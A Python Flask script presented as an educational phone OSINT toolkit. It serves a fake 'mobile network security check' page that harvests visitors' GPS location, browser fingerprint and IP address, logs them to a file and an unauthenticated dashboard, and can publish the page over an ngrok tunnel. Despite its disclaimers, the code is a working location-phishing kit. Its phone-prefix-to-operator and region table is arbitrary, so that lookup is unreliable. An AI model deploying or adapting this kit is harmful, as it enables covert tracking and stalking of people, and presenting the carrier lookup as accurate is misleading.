#!/usr/bin/env python3
"""
PROFESSIONAL PHONE OSINT TOOLKIT - EDUCATIONAL VERSION
=======================================================
For CYBER SECURITY COACHING purposes only.

WHAT STUDENTS LEARN:
1. How mobile networks track location (SS7, Cell Towers, Triangulation)
2. How phishing attacks work and how to protect against them
3. What information is publicly available from phone numbers
4. Legal boundaries of OSINT in India

⚠️ LEGAL DISCLAIMER:
- Use ONLY with explicit consent from the target
- This is for EDUCATIONAL and AWARENESS purposes
- Unauthorized tracking is ILLEGAL under IT Act 2000
- Do NOT use for stalking or harassment
"""

import os
import json
import re
import socket
import subprocess
import sys
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify

# ============================================================
# CONFIGURATION
# ============================================================
app = Flask(__name__)

# Store collected data for demonstration
collected_data = []

# ============================================================
# HTML TEMPLATE - Educational Tracking Page
# ============================================================
TRACKING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📱 Mobile Network Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 25px;
            padding: 35px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
        }
        
        h1 {
            color: #1a1a2e;
            text-align: center;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .subtitle {
            text-align: center;
            color: #666;
            margin-bottom: 25px;
            font-size: 14px;
        }
        
        .educational-badge {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 12px;
            border-radius: 12px;
            text-align: center;
            margin-bottom: 20px;
            font-size: 13px;
        }
        
        .warning-box {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 13px;
            color: #856404;
        }
        
        .info-box {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 13px;
            color: #0c5460;
        }
        
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 24px;
            width: 100%;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 0;
            transition: transform 0.2s;
        }
        
        button:hover {
            transform: translateY(-2px);
        }
        
        button.secondary {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        }
        
        .result-box {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 15px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 12px;
            display: none;
        }
        
        .footer {
            text-align: center;
            font-size: 11px;
            color: #999;
            margin-top: 20px;
            padding-top: 15px;
            border-top: 1px solid #eee;
        }
        
        .tech-details {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 12px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 11px;
            margin-top: 15px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📱 Mobile Network Security Check</h1>
        <div class="subtitle">Educational Cybersecurity Demonstration</div>
        
        <div class="educational-badge">
            🎓 CYBER SECURITY AWARENESS TRAINING
        </div>
        
        <div class="warning-box">
            ⚠️ EDUCATIONAL DEMO: This demonstrates how phishing attacks collect data.<br>
            Your data is ONLY collected with your consent for this demonstration.
        </div>
        
        <div class="info-box">
            📚 WHAT STUDENTS LEARN:<br>
            • How mobile networks track location (Cell Tower Triangulation)<br>
            • How phishing links can steal personal data<br>
            • Why you should NEVER click suspicious links<br>
            • How to protect your privacy online
        </div>
        
        <p style="margin: 15px 0; color: #555; text-align: center;">
            Your mobile network requires a security verification. 
            Please grant location access to continue.
        </p>
        
        <button onclick="getLocation()">📍 Share Location for Security Check</button>
        <button class="secondary" onclick="getDeviceInfo()">📱 View Device Information</button>
        
        <div id="result" class="result-box">
            <strong>📋 Data Being Collected (Educational Demo):</strong><br>
            <div id="resultContent">Click a button above to see how data is collected.</div>
        </div>
        
        <div class="tech-details" id="techDetails">
            🔬 TECHNICAL BACKGROUND: Mobile networks use triangulation between multiple cell towers to estimate device location. This demonstration shows how easily location data can be obtained through social engineering.
        </div>
        
        <div class="footer">
            This is an EDUCATIONAL demonstration for cybersecurity training.<br>
            Based on real-world OSINT techniques
        </div>
    </div>
    
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        var data = {
                            type: 'location',
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date().toISOString()
                        };
                        sendData(data);
                        document.getElementById('result').style.display = 'block';
                        document.getElementById('resultContent').innerHTML = 
                            '📍 LOCATION DATA:<br>' +
                            '• Latitude: ' + position.coords.latitude + '<br>' +
                            '• Longitude: ' + position.coords.longitude + '<br>' +
                            '• Accuracy: ' + position.coords.accuracy + ' meters<br>' +
                            '• Time: ' + new Date().toLocaleString() + '<br><br>' +
                            '<strong>⚠️ EDUCATIONAL NOTE:</strong> This demonstrates how easily your location can be exposed through phishing links. Always verify website authenticity before granting location access.';
                    },
                    function(error) {
                        document.getElementById('result').style.display = 'block';
                        document.getElementById('resultContent').innerHTML = 
                            '❌ Location access denied. This demonstrates why consent is important.<br><br>' +
                            '💡 EDUCATIONAL NOTE: Modern browsers require user permission before sharing location. This is a privacy protection feature.';
                    }
                );
            } else {
                document.getElementById('result').style.display = 'block';
                document.getElementById('resultContent').innerHTML = 
                    '❌ Geolocation not supported by this browser.';
            }
        }
        
        function getDeviceInfo() {
            var data = {
                type: 'device',
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timestamp: new Date().toISOString()
            };
            sendData(data);
            document.getElementById('result').style.display = 'block';
            document.getElementById('resultContent').innerHTML = 
                '📱 DEVICE INFORMATION:<br>' +
                '• Browser: ' + navigator.userAgent.split(' ').slice(0,3).join(' ') + '<br>' +
                '• Platform: ' + navigator.platform + '<br>' +
                '• Language: ' + navigator.language + '<br>' +
                '• Screen: ' + screen.width + 'x' + screen.height + '<br>' +
                '• Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '<br><br>' +
                '<strong>⚠️ EDUCATIONAL NOTE:</strong> Your browser shares this information with every website you visit. This is called "browser fingerprinting" and can be used to track you across websites.';
        }
        
        function sendData(data) {
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }
    </script>
</body>
</html>
"""

# ============================================================
# CARRIER DETECTION MODULE
# ============================================================

def detect_carrier(phone_number: str) -> dict:
    """Detect mobile carrier/operator from phone number"""
    digits = re.sub(r'\D', '', phone_number)
    
    if len(digits) >= 10:
        number = digits[-10:]
        prefix = number[:2]
        full_number = f"+91{number}"
    else:
        return {"error": "Invalid number format", "valid": False}
    
    operators = {
        '70': 'Reliance Jio', '71': 'Reliance Jio', '72': 'Reliance Jio',
        '73': 'Reliance Jio', '74': 'Reliance Jio', '90': 'Reliance Jio',
        '91': 'Reliance Jio', '92': 'Reliance Jio', '93': 'Reliance Jio',
        '94': 'Reliance Jio', '75': 'Bharti Airtel', '76': 'Bharti Airtel',
        '77': 'Bharti Airtel', '78': 'Bharti Airtel', '79': 'Bharti Airtel',
        '95': 'Bharti Airtel', '96': 'Bharti Airtel', '97': 'Bharti Airtel',
        '98': 'Bharti Airtel', '99': 'Bharti Airtel', '80': 'BSNL',
        '81': 'BSNL', '82': 'BSNL', '83': 'BSNL', '84': 'BSNL',
        '85': 'Vodafone Idea (Vi)', '86': 'Vodafone Idea (Vi)',
        '87': 'Vodafone Idea (Vi)', '88': 'Vodafone Idea (Vi)',
        '89': 'Vodafone Idea (Vi)'
    }
    
    circles = {
        '70': 'Maharashtra', '71': 'Gujarat', '72': 'Mumbai', '73': 'Karnataka',
        '74': 'Tamil Nadu', '75': 'Delhi NCR', '76': 'Rajasthan', '77': 'Kolkata',
        '78': 'Punjab', '79': 'Madhya Pradesh', '80': 'UP East', '81': 'West Bengal',
        '82': 'Bihar', '83': 'Haryana', '84': 'Kerala', '85': 'Andhra Pradesh',
        '86': 'Telangana', '87': 'Odisha', '88': 'Assam', '89': 'Himachal Pradesh',
        '90': 'UP West', '91': 'Jammu & Kashmir', '92': 'Chhattisgarh',
        '93': 'Jharkhand', '94': 'Goa', '95': 'Chandigarh', '96': 'Uttarakhand'
    }
    
    operator = operators.get(prefix, "Unknown Operator")
    circle = circles.get(prefix[:2], circles.get(prefix, "India"))
    
    return {
        "valid": True,
        "number": number,
        "full_number": full_number,
        "operator": operator,
        "circle": circle,
        "country": "India"
    }


# ============================================================
# FLASK ROUTES
# ============================================================

@app.route('/')
def index():
    """Serve the educational tracking page"""
    return render_template_string(TRACKING_PAGE)


@app.route('/collect', methods=['POST'])
def collect_data():
    """Collect data from the tracking page"""
    data = request.json
    data['server_timestamp'] = datetime.now().isoformat()
    data['ip_address'] = request.remote_addr
    collected_data.append(data)
    
    with open('collected_data.json', 'a') as f:
        json.dump(data, f)
        f.write('\n')
    
    print(f"\n📥 EDUCATIONAL DEMO - DATA COLLECTED:")
    print(f"   Type: {data.get('type', 'unknown')}")
    print(f"   IP: {request.remote_addr}")
    print(f"   Time: {data.get('server_timestamp')}")
    if data.get('type') == 'location':
        print(f"   Location: {data.get('lat')}, {data.get('lon')}")
    
    return jsonify({"status": "success"})


@app.route('/dashboard')
def dashboard():
    """Dashboard for instructors to monitor collected data"""
    return jsonify({
        "timestamp": datetime.now().isoformat(),
        "collected_count": len(collected_data),
        "data": collected_data[-20:] if collected_data else []
    })


@app.route('/carrier-lookup')
def carrier_lookup():
    """API endpoint for carrier detection"""
    phone = request.args.get('phone', '')
    if not phone:
        return jsonify({"error": "Phone number required"})
    
    result = detect_carrier(phone)
    return jsonify(result)


# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def setup_ngrok(port=5000):
    """Setup ngrok tunnel for public access"""
    try:
        result = subprocess.run(['which', 'ngrok'], capture_output=True, text=True)
        if result.returncode != 0:
            print("\n⚠️ ngrok not found. Install from: https://ngrok.com")
            return None
        
        import threading
        import time
        import requests
        
        def run_ngrok():
            subprocess.Popen(['ngrok', 'http', str(port)], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
        
        threading.Thread(target=run_ngrok, daemon=True).start()
        time.sleep(2)
        
        response = requests.get('http://localhost:4040/api/tunnels', timeout=5)
        tunnels = response.json()
        public_url = tunnels['tunnels'][0]['public_url']
        return public_url
    except Exception as e:
        print(f"⚠️ Ngrok setup failed: {e}")
        return None


def print_welcome():
    """Print welcome banner"""
    print("""
    ╔══════════════════════════════════════════════════════════════════════════════╗
    ║     🎓 PROFESSIONAL PHONE OSINT TOOLKIT - EDUCATIONAL VERSION                ║
    ║                          For CYBER SECURITY COACHING                         ║
    ╚══════════════════════════════════════════════════════════════════════════════╝
    
    📚 WHAT STUDENTS WILL LEARN:
    • How mobile networks track location (Cell Tower Triangulation)
    • How phishing attacks work and how to protect against them
    • What information is publicly available from phone numbers
    • Legal boundaries of OSINT in India
    
    ⚠️ LEGAL DISCLAIMER:
    This tool is for EDUCATIONAL PURPOSES ONLY.
    Use ONLY with explicit consent from the target.
    Unauthorized tracking is ILLEGAL under IT Act 2000.
    
    PENALTIES IN INDIA:
    • IT Act 2000, Section 66C: 3-7 years imprisonment
    • IPC Section 354D (Stalking): 3 years imprisonment
    """)

# ============================================================
# MAIN APPLICATION
# ============================================================

def main():
    """Main entry point"""
    print_welcome()
    
    print("\n📋 SETUP INSTRUCTIONS:")
    print("=" * 70)
    
    phone = input("\n📞 Enter phone number for carrier demo (e.g., 9876543210) or 'skip': ").strip()
    
    if phone.lower() != 'skip':
        carrier_info = detect_carrier(phone)
        if carrier_info.get('valid'):
            print(f"\n📡 CARRIER DEMONSTRATION RESULT:")
            print(f"   Number: {carrier_info['full_number']}")
            print(f"   Operator: {carrier_info['operator']}")
            print(f"   Circle/State: {carrier_info['circle']}")
    
    local_ip = get_local_ip()
    print(f"\n🌐 LOCAL NETWORK ACCESS:")
    print(f"   URL: http://{local_ip}:5000")
    
    use_ngrok = input("\n🔗 Enable public access via ngrok? (y/n): ").lower() == 'y'
    
    if use_ngrok:
        public_url = setup_ngrok(5000)
        if public_url:
            print(f"\n🌍 PUBLIC ACCESS LINK:")
            print(f"   {public_url}")
    
    print("\n" + "=" * 70)
    print("🚀 STARTING FLASK SERVER...")
    print("=" * 70)
    print("\n📋 HOW TO DEMONSTRATE TO STUDENTS:")
    print("   1. Share the link with students")
    print("   2. When they click 'Share Location', explain how phishing works")
    print("   3. Check collected data at: http://localhost:5000/dashboard")
    print("   4. Review carrier detection results")
    print("\n⚠️ Press Ctrl+C to stop the server\n")
    
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    except KeyboardInterrupt:
        print("\n\n👋 Server stopped. Educational demonstration complete!")
        sys.exit(0)

if __name__ == "__main__":
    main()